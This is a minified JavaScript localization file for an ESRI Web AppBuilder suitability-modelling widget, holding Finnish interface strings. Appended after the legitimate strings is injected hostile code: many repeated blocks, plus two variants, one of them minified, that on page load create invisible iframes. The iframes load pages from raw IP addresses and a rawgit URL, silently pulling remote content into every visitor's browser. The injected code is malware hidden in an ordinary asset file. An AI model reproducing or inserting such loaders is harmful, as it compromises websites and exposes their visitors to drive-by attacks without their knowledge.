// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/SuitabilityModeler/nls/strings":{_widgetLabel:"Sopivuusmallinnus",general:{clear:"Tyhjenn\u00e4",cancel:"Peruuta",save:"Suorita",saveAs:"Vie"},saveModel:{save:"Vie",title:"Otsikko: ",summary:"Yhteenveto: ",description:"Kuvaus: ",tags:"Tunnisteet: ",folder:"Kansio: ",homeFolderPattern:"{username} (aloitussivu)",failed:"Vieminen ep\u00e4onnistui."},util:{colorRamp:{1:"Eritt\u00e4in alhainen",2:"Hyvin alhainen",3:"Alhainen",4:"Alle keskitason",5:"Keskitaso",6:"Yli keskitason",7:"Suuri",
8:"Hyvin suuri",9:"Eritt\u00e4in suuri",low:"Alhainen",high:"Suuri",tipPattern:"Tunnustekstin arvot",flipCaption:"K\u00e4\u00e4nn\u00e4"}},wro:{caption:"Sopivuusmallinnus",browsePrompt:"Painotetun p\u00e4\u00e4llekk\u00e4isyyden palvelu",selectLayersCaption:"Valitse tasot",selectLayers:"Karttatasot",designModelCaption:"Suunnittelumalli",designModel:"Suunnittelumalli",transparency:"L\u00e4pin\u00e4kyvyys",visible:"N\u00e4kyv\u00e4",total:"Yhteens\u00e4",unableToLoad:"Mallin lataus ei onnistu.",projectNotOpen:"Projektia ei ole avoinna.",
readMore:"Lue lis\u00e4\u00e4",validation:{validating:"Validoidaan...",invalidItemCaption:"Painotetun p\u00e4\u00e4llekk\u00e4isyyden palvelun varoitus",notAnImageService:"T\u00e4m\u00e4 kohde ei ole kuvapalvelu.",notAWroService:"T\u00e4m\u00e4 kohde ei ole painotetun p\u00e4\u00e4llekk\u00e4isyyden palvelu.",undefinedUrl:"T\u00e4m\u00e4n kohteen URL-osoitetta ei ole m\u00e4\u00e4ritetty.",inaccessible:"Palvelu ei ole k\u00e4ytett\u00e4viss\u00e4.",generalError:"Kohdetta ei voi avata.",missingFieldPattern:"Kentt\u00e4 {field} on pakollinen",
notAllowRasterFunction:"allowRasterFunction-arvon on oltava tosi",notNearestResampling:"defaultResamplingMethod-arvon on oltava L\u00e4hin",notIsWeightedOverlayProp:"Avainominaisuuden IsWeightedOverlay arvon on oltava tosi",invalidLink:"URL-osoite ei kelpaa. Valitun karttatason sivuston avaaminen ep\u00e4onnistui.",unexpectedError:"Odottamaton tila.",rangeMessage:"Arvon on oltava v\u00e4lill\u00e4 ${0} ja ${1}",rangeMessage100:"Arvon on oltava v\u00e4lill\u00e4 0 ja 100.",maxLayers:"Palvelun sallittujen karttatasojen enimm\u00e4ism\u00e4\u00e4r\u00e4 on ${0}. Sinun on poistettava karttataso ennen uuden lis\u00e4\u00e4mist\u00e4.",
notFound:"Karttatasoa ${0} ei l\u00f6ydy painotetun p\u00e4\u00e4llekk\u00e4isyyden palvelusta",wroServiceNotDefined:"Mallille ei ole m\u00e4\u00e4ritetty painotetun p\u00e4\u00e4llekk\u00e4isyyden palvelua.",overlayLayerOutputInvalid:"P\u00e4\u00e4llekk\u00e4isen karttatason [${0}] uudelleenyhdist\u00e4misen arvoalueiden [${1}] tulosaineiston arvo puuttuu tai on virheellinen",overlayLayerInputInvalid:"P\u00e4\u00e4llekk\u00e4isen karttatason [${0}] uudelleenyhdist\u00e4misen arvoalueiden [${1}] l\u00e4ht\u00f6aineiston minimi/maksimi puuttuu tai on virheellinen",
overlayLayerRangesMissing:"P\u00e4\u00e4llekk\u00e4isest\u00e4 karttatasosta [${0}] puuttuvat uudelleenyhdist\u00e4misen arvoalueet",overlayLayerWeight:"P\u00e4\u00e4llekk\u00e4isen karttatason painoarvojen on oltava enint\u00e4\u00e4n 100",overlayLayerRequired:"V\u00e4hint\u00e4\u00e4n yksi p\u00e4\u00e4llekk\u00e4inen karttataso on pakollinen",overlayLayerNotDefined:"P\u00e4\u00e4llekk\u00e4isi\u00e4 karttatasoja ei ole m\u00e4\u00e4ritetty",requiresColormap:"T\u00e4m\u00e4 rasteritoiminto edellytt\u00e4\u00e4 v\u00e4rikarttaa, mutta mallilla ei ole kelvollista v\u00e4rikarttam\u00e4\u00e4ritelm\u00e4\u00e4",
createModelError:"Virhe luotaessa mallia",invalidModel:"Malli ei kelpaa",imageServiceNotDefined:"Kuvapalvelukarttatasoa ei ole m\u00e4\u00e4ritetty",imageLayerNotDefined:"Kuvapalvelukarttatasoa ei ole m\u00e4\u00e4ritetty",histogramNotDefined:"Painotetun p\u00e4\u00e4llekk\u00e4isyyden histogrammitoimintoa ei ole m\u00e4\u00e4ritetty."},colorRampLabel:{"Green Yellow Red":"Vihre\u00e4 Keltainen Punainen","Red Yellow Green":"Punainen Keltainen Vihre\u00e4","Yellow to Dark Red":"Keltaisesta tummanpunaiseen",
"Dark Red to Yellow":"Tummanpunaisesta keltaiseen","Light Gray to Dark Gray":"Vaaleanharmaasta tummanharmaaseen","Dark Gray to Light Gray":"Tummanharmaasta vaaleanharmaaseen","Light Brown to Dark Brown":"Vaaleanruskeasta tummanruskeaan","Dark Brown to Light Brown":"Tummanruskeasta vaaleanruskeaan","Full Spectrum - Bright Red to Blue":"Koko spektri \u2013 Kirkkaanpunaisesta siniseen","Full Spectrum - Bright Blue to Red":"Koko spektri \u2013 Kirkkaansinisest\u00e4 punaiseen","Partial Spectrum - Yellow to Blue":"Osittainen spektri \u2013 Keltaisesta siniseen",
"Partial Spectrum - Blue to Yellow":"Osittainen spektri \u2013 Sinisest\u00e4 keltaiseen","Yellow-Green to Dark Blue":"Keltaisenvihre\u00e4st\u00e4 tummansiniseen","Dark Blue to Yellow-Green":"Tummansinisest\u00e4 keltaisenvihre\u00e4\u00e4n","Cold to Hot Diverging":"Kylm\u00e4st\u00e4 kuumaan hajaantuen","Hot to Cold Diverging":"Kuumasta kylm\u00e4\u00e4n hajaantuen","Surface - Low to High":"Pinta \u2013 Alhaisesta suureen","Surface - High to Low":"Pinta \u2013 Suuresta alhaiseen"}},_localized:{}},
"widgets/SuitabilityModeler/setting/nls/strings":{allowSaveAs:"Salli vienti",startingState:"Aloitustila:",byUrl:"Tyhj\u00e4 malli",byItem:"Ennalta m\u00e4\u00e4ritetty malli",imageServiceUrl:"Kuvapalvelun URL",validate:"Validoi",validating:"Validoidaan...",validated:"URL-osoite on kelvollinen.",modelName:"Malli",selectModel:"Valitse",itemSelectorTitle:"Valitse malli",ok:"OK",cancel:"Peruuta",description1:"Sopivuusmallinnuksesta on hy\u00f6ty\u00e4 parhaan sijainnin l\u00f6yt\u00e4misess\u00e4 toimintoa varten, riskialttiuden ennustamisessa tai sen tunnistamisessa, miss\u00e4 jotain tapahtuu todenn\u00e4k\u00f6isesti. T\u00e4m\u00e4n pienoisohjelman avulla voit yhdist\u00e4\u00e4 ja punnita eri karttatasoja, jotta voit arvioida useita tekij\u00f6it\u00e4 yhdell\u00e4 kertaa.",
description2:"Sopivuusmallinnus k\u00e4ytt\u00e4\u00e4 nopeaa, verkkopohjaista painotettua rasterikerrosta mallien luontiin palvelusta. Voit aloittaa painotetun rasterikerrospalvelun (Weight Raster Overlay, WRO) tyhj\u00e4st\u00e4 tilasta tai ennalta m\u00e4\u00e4ritetyst\u00e4 WRO-mallista. M\u00e4\u00e4rit\u00e4 analyysi valitsemalla karttatasot, m\u00e4\u00e4ritt\u00e4m\u00e4ll\u00e4 painot ja s\u00e4\u00e4t\u00e4m\u00e4ll\u00e4 karttatason luokitteluarvoja. Suorita sen j\u00e4lkeen mallinnus, visualisoi tulokset ja tallenna tulokset halutessasi kohteena organisaatioosi tai portaaliisi.",
description3:"Lis\u00e4tietoja GeoPlanner-sopivuusmallinnuksesta.",_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});